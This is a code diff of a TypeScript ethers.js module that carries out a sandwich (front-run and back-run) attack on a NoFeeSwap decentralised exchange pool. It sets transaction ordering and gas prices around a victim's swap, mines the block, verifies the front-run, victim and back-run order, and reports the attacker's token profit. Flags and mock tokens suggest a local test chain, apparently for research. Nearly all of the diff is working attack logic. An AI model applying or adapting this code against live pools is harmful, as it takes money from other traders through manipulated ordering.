@@ -1,6 +1,6 @@
 import { ethers } from "ethers";
 import { DEPLOYMENT, NOFEESWAP_ABI } from "./config";
-import type { DecodedSwap, SwapAnalysis } from "./types";
+import type { AttackExecutionResult, DecodedSwap, SwapAnalysis } from "./types";
 
 const X59 = 2n ** 59n;
 const X63 = 2n ** 63n;
@@ -36,13 +36,7 @@ type ExecConfig = {
   attackerIndex: number;
   attackFractionBps: number;
   minNetPnl: number;
-};
-
-type AttackExecutionResult = {
-  executed: boolean;
-  skippedReason?: string;
-  frontrunHash?: string;
-  backrunHash?: string;
+  mineAfterSubmit: boolean;
 };
 
 let preparedAttackerAddress: string | null = null;
@@ -59,7 +53,8 @@ export function getExecConfig(): ExecConfig {
     enabled: String(process.env.EXECUTE_LOCAL_ATTACK ?? "false").toLowerCase() === "true",
     attackerIndex: Math.max(2, Math.floor(parseEnvNumber("ATTACKER_INDEX", 2))),
     attackFractionBps: Math.min(9000, Math.max(100, Math.floor(parseEnvNumber("ATTACK_FRACTION_BPS", 3000)))),
-    minNetPnl: parseEnvNumber("MIN_NET_PNL_TOKENOUT", 0)
+    minNetPnl: parseEnvNumber("MIN_NET_PNL_TOKENOUT", 0),
+    mineAfterSubmit: String(process.env.MINE_AFTER_ATTACK ?? "true").toLowerCase() === "true"
   };
 }
 
@@ -242,19 +237,40 @@ export async function tryExecuteLocalSandwich(params: {
   const nofeeswap = new ethers.Contract(DEPLOYMENT.contracts.nofeeswap, NOFEESWAP_EXEC_ABI, attacker);
   const token0 = DEPLOYMENT.mockTokens.token0;
   const token1 = DEPLOYMENT.mockTokens.token1;
-  const limitPrice = decoded.zeroForOne === 0 ? report.currentPrice * 1.2 : report.currentPrice * 0.8;
+  const frontDirection = decoded.zeroForOne <= 1 ? decoded.zeroForOne : 0;
+  const backDirection = frontDirection === 0 ? 1 : 0;
+  const frontLimitPrice = frontDirection === 0 ? report.currentPrice * 1.25 : report.currentPrice * 0.75;
+  const backLimitPrice = backDirection === 0 ? report.currentPrice * 1.25 : report.currentPrice * 0.75;
   const deadline = Math.floor(Date.now() / 1000) + 1200;
-  const sequence = buildSwapSequence({
+  const frontrunSequence = buildSwapSequence({
     nofeeswap: DEPLOYMENT.contracts.nofeeswap,
     token0,
     token1,
     recipient: attackerAddress,
     poolId: decoded.poolId,
     amountSpecified: attackAmount,
-    limitPrice,
-    zeroForOne: decoded.zeroForOne <= 1 ? decoded.zeroForOne : 0,
+    limitPrice: frontLimitPrice,
+    zeroForOne: frontDirection,
     deadline
   });
+  const backrunSequence = buildSwapSequence({
+    nofeeswap: DEPLOYMENT.contracts.nofeeswap,
+    token0,
+    token1,
+    recipient: attackerAddress,
+    poolId: decoded.poolId,
+    amountSpecified: attackAmount,
+    limitPrice: backLimitPrice,
+    zeroForOne: backDirection,
+    deadline
+  });
+
+  const token0Contract = new ethers.Contract(token0, ERC20_ABI, provider);
+  const token1Contract = new ethers.Contract(token1, ERC20_ABI, provider);
+  const [before0, before1] = await Promise.all([
+    token0Contract.balanceOf(attackerAddress),
+    token1Contract.balanceOf(attackerAddress)
+  ]);
 
   const feeData = await provider.getFeeData();
   const victimGasPrice = decoded.gasPriceGwei
@@ -266,21 +282,63 @@ export async function tryExecuteLocalSandwich(params: {
     : ethers.parseUnits("1", "gwei");
 
   const nextNonce = await provider.getTransactionCount(attackerAddress, "pending");
-  const frontrun = await nofeeswap.unlock(DEPLOYMENT.contracts.operator, sequence, {
+  const frontrun = await nofeeswap.unlock(DEPLOYMENT.contracts.operator, frontrunSequence, {
     nonce: nextNonce,
     gasPrice: frontrunGasPrice,
     gasLimit: 900_000
   });
 
-  const backrun = await nofeeswap.unlock(DEPLOYMENT.contracts.operator, sequence, {
+  const backrun = await nofeeswap.unlock(DEPLOYMENT.contracts.operator, backrunSequence, {
     nonce: nextNonce + 1,
     gasPrice: backrunGasPrice,
     gasLimit: 900_000
   });
 
+  if (config.mineAfterSubmit) {
+    await provider.send("evm_mine", []);
+  }
+
+  const [frontReceipt, backReceipt, victimTx] = await Promise.all([
+    frontrun.wait(),
+    backrun.wait(),
+    provider.getTransaction(decoded.hash)
+  ]);
+  const victimReceipt = victimTx ? await victimTx.wait() : null;
+
+  let orderVerified = false;
+  if (
+    victimReceipt &&
+    victimReceipt.blockNumber === frontReceipt.blockNumber &&
+    victimReceipt.blockNumber === backReceipt.blockNumber
+  ) {
+    const block = await provider.send("eth_getBlockByNumber", [
+      ethers.toQuantity(frontReceipt.blockNumber),
+      true
+    ]) as { transactions?: Array<{ hash?: string }> };
+    if (block?.transactions && block.transactions.length > 0) {
+      const hashes = block.transactions.map((entry) => entry.hash ?? "");
+      const iFront = hashes.indexOf(frontrun.hash);
+      const iVictim = hashes.indexOf(decoded.hash);
+      const iBack = hashes.indexOf(backrun.hash);
+      orderVerified = iFront >= 0 && iVictim >= 0 && iBack >= 0 && iFront < iVictim && iVictim < iBack;
+    }
+  }
+
+  const [after0, after1] = await Promise.all([
+    token0Contract.balanceOf(attackerAddress),
+    token1Contract.balanceOf(attackerAddress)
+  ]);
+
   return {
     executed: true,
     frontrunHash: frontrun.hash,
-    backrunHash: backrun.hash
+    backrunHash: backrun.hash,
+    victimHash: decoded.hash,
+    frontrunBlock: frontReceipt.blockNumber,
+    victimBlock: victimReceipt?.blockNumber,
+    backrunBlock: backReceipt.blockNumber,
+    orderVerified,
+    attackerDeltaToken0: (after0 - before0).toString(),
+    attackerDeltaToken1: (after1 - before1).toString()
   };
 }
